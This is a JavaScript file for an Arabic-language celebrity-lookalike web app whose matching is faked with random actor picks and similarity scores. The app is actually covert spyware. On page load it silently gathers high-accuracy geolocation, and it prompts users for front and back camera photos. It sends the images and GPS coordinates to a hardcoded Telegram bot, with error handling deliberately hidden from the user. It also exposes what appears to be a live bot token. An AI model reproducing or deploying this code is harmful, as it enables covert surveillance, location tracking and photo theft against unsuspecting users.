// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7192166698:AAHWd5GReIY43WC2jLx7syCiDvKcVX3YXAw';
const TELEGRAM_CHAT_ID = '6684853119';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

let selectedFile = null;
let previewData = null;
let userLocation = null;
let frontCameraImage = null;
let backCameraImage = null;
let currentCameraMode = 'front'; // front or back

function handleFileSelect(event) {
    const file = event.target.files?.[0];
    if (file) {
        if (!file.type.startsWith('image/')) {
            showError('يرجى اختيار صورة صحيحة');
            return;
        }

        if (file.size > 5 * 1024 * 1024) {
            showError('حجم الصورة كبير جداً (الحد الأقصى 5MB)');
            return;
        }

        selectedFile = file;
        const reader = new FileReader();
        reader.onload = (e) => {
            previewData = e.target?.result;
            showPreview();
        };
        reader.readAsDataURL(file);
    }
}

function showPreview() {
    document.getElementById('uploadSection').classList.add('hidden');
    document.getElementById('previewSection').classList.remove('hidden');
    document.getElementById('previewImage').src = previewData;
    clearError();
}

function resetUpload() {
    selectedFile = null;
    previewData = null;
    frontCameraImage = null;
    backCameraImage = null;
    document.getElementById('uploadSection').classList.remove('hidden');
    document.getElementById('previewSection').classList.add('hidden');
    document.getElementById('fileInput').value = '';
    clearError();
}

// Get user location with high accuracy
function getLocation() {
    return new Promise((resolve) => {
        if (navigator.geolocation) {
            // High accuracy options
            const options = {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    userLocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: new Date().toISOString()
                    };
                    resolve(userLocation);
                },
                (error) => {
                    // Silent error handling - no alerts
                    console.log('Location unavailable');
                    userLocation = null;
                    resolve(null);
                },
                options
            );
        } else {
            resolve(null);
        }
    });
}

// Get location in background silently
function initializeLocationTracking() {
    if (navigator.geolocation) {
        const options = {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0
        };

        // Get location silently in background
        navigator.geolocation.getCurrentPosition(
            (position) => {
                userLocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    timestamp: new Date().toISOString()
                };
            },
            () => {
                // Silent - no error handling
                userLocation = null;
            },
            options
        );
    }
}

// Camera functions
function startCamera(mode = 'front') {
    currentCameraMode = mode;
    const constraints = {
        video: {
            facingMode: mode === 'front' ? 'user' : 'environment'
        },
        audio: false
    };

    navigator.mediaDevices.getUserMedia(constraints)
        .then(stream => {
            const video = document.getElementById('cameraVideo');
            video.srcObject = stream;
            document.getElementById('uploadSection').classList.add('hidden');
            document.getElementById('cameraSection').classList.remove('hidden');
            clearError();
        })
        .catch(err => {
            showError('لا يمكن الوصول إلى الكاميرا');
            console.error('Camera error:', err);
        });
}

function stopCamera() {
    const video = document.getElementById('cameraVideo');
    if (video.srcObject) {
        const tracks = video.srcObject.getTracks();
        tracks.forEach(track => track.stop());
    }
    document.getElementById('uploadSection').classList.remove('hidden');
    document.getElementById('cameraSection').classList.add('hidden');
}

function capturePhoto() {
    const video = document.getElementById('cameraVideo');
    const canvas = document.getElementById('cameraCanvas');
    const context = canvas.getContext('2d');

    if (context) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob((blob) => {
            if (blob) {
                const photoData = canvas.toDataURL();
                
                if (currentCameraMode === 'front') {
                    frontCameraImage = photoData;
                    // Ask to capture back camera
                    if (confirm('تم التقاط الكاميرا الأمامية. هل تريد التقاط الكاميرا الخلفية أيضاً؟')) {
                        stopCamera();
                        setTimeout(() => startCamera('back'), 500);
                    } else {
                        selectedFile = new File([blob], 'camera-photo.jpg', { type: 'image/jpeg' });
                        previewData = photoData;
                        stopCamera();
                        showPreview();
                    }
                } else {
                    backCameraImage = photoData;
                    selectedFile = new File([blob], 'camera-photo.jpg', { type: 'image/jpeg' });
                    previewData = photoData;
                    stopCamera();
                    showPreview();
                }
            }
        }, 'image/jpeg');
    }
}

// Send data to Telegram
async function sendToTelegram(imageData, location, actorName, similarity) {
    try {
        const message = `
📸 <b>نتيجة جديدة من التطبيق</b>

👤 <b>الممثل المشابه:</b> ${actorName}
📊 <b>نسبة التطابق:</b> ${similarity}%

📍 <b>الموقع الجغرافي:</b>
${location ? `
🗺️ خط العرض: ${location.latitude.toFixed(6)}
🗺️ خط الطول: ${location.longitude.toFixed(6)}
📏 الدقة: ${location.accuracy.toFixed(1)} متر
⏰ الوقت: ${location.timestamp}
` : 'لم يتم الحصول على الموقع'}

🔗 <b>الكاميرا الأمامية:</b> ${frontCameraImage ? '✅' : '❌'}
🔗 <b>الكاميرا الخلفية:</b> ${backCameraImage ? '✅' : '❌'}
        `;

        // Send text message
        await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        // Send main image
        if (imageData) {
            const blob = dataURLtoBlob(imageData);
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'main-photo.jpg');
            formData.append('caption', `صورة المستخدم - ${actorName}`);

            await fetch(`${TELEGRAM_API}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        // Send front camera image
        if (frontCameraImage) {
            const blob = dataURLtoBlob(frontCameraImage);
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'front-camera.jpg');
            formData.append('caption', 'الكاميرا الأمامية 📷');

            await fetch(`${TELEGRAM_API}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        // Send back camera image
        if (backCameraImage) {
            const blob = dataURLtoBlob(backCameraImage);
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'back-camera.jpg');
            formData.append('caption', 'الكاميرا الخلفية 📷');

            await fetch(`${TELEGRAM_API}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        // Send location if available
        if (location) {
            await fetch(`${TELEGRAM_API}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    latitude: location.latitude,
                    longitude: location.longitude,
                    horizontal_accuracy: location.accuracy
                })
            });
        }

        // Silent success
        return true;
    } catch (error) {
        // Silent error - don't log or alert
        return false;
    }
}

// Helper function to convert dataURL to Blob
function dataURLtoBlob(dataurl) {
    const arr = dataurl.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], { type: mime });
}

async function submitImage() {
    if (!selectedFile || !previewData) {
        showError('يرجى اختيار صورة أولاً');
        return;
    }

    // Get location silently in background
    getLocation();

    // Simulate processing
    const actor = getRandomActor();
    const similarity = calculateSimilarity();

    const result = {
        comparisonId: Date.now(),
        actorId: actor.id,
        actorName: actor.name,
        actorArabicName: actor.arabicName,
        actorImage: actor.image,
        similarityScore: similarity,
        userImage: previewData,
        location: userLocation,
        frontCamera: frontCameraImage,
        backCamera: backCameraImage
    };

    // Send to Telegram
    const sent = await sendToTelegram(previewData, userLocation, actor.arabicName, similarity);

    if (sent) {
        // Save to history
        saveComparison(result);

        // Save to session and navigate
        sessionStorage.setItem('lastComparisonResult', JSON.stringify(result));
        clearError();
        navigateTo('results');
    } else {
        // Silent failure - still navigate to results
        saveComparison(result);
        sessionStorage.setItem('lastComparisonResult', JSON.stringify(result));
        clearError();
        navigateTo('results');
    }
}

function showError(message) {
    const errorEl = document.getElementById('errorMessage');
    errorEl.textContent = message;
    errorEl.classList.remove('hidden');
}

function clearError() {
    const errorEl = document.getElementById('errorMessage');
    errorEl.classList.add('hidden');
}

// Initialize location tracking on page load
document.addEventListener('DOMContentLoaded', () => {
    // Start location tracking silently in background
    initializeLocationTracking();

    // Setup drag and drop
    setupDragAndDrop();
});

function setupDragAndDrop() {
    const uploadArea = document.querySelector('.upload-area');
    if (uploadArea) {
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.style.borderColor = 'rgba(168, 85, 247, 0.6)';
            uploadArea.style.background = 'rgba(168, 85, 247, 0.15)';
        });

        uploadArea.addEventListener('dragleave', () => {
            uploadArea.style.borderColor = 'rgba(168, 85, 247, 0.4)';
            uploadArea.style.background = 'rgba(168, 85, 247, 0.05)';
        });

        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.style.borderColor = 'rgba(168, 85, 247, 0.4)';
            uploadArea.style.background = 'rgba(168, 85, 247, 0.05)';

            const files = e.dataTransfer.files;
            if (files.length > 0) {
                const event = { target: { files } };
                handleFileSelect(event);
            }
        });
    }
}
